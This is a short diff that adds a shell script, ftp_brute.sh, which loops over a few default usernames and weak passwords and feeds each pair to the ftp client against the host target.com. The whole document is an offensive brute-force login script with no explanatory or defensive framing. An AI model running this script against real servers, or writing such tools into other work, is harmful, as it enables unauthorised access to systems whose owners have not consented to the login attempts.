@@ -1,0 +1,8 @@
+# ftp_brute.sh
+for user in anonymous ftp; do
+  for pass in "" anonymous password; do
+    echo "USER $user" > ftp.txt
+    echo "PASS $pass" >> ftp.txt
+    ftp -nv < ftp.txt target.com
+  done
+done
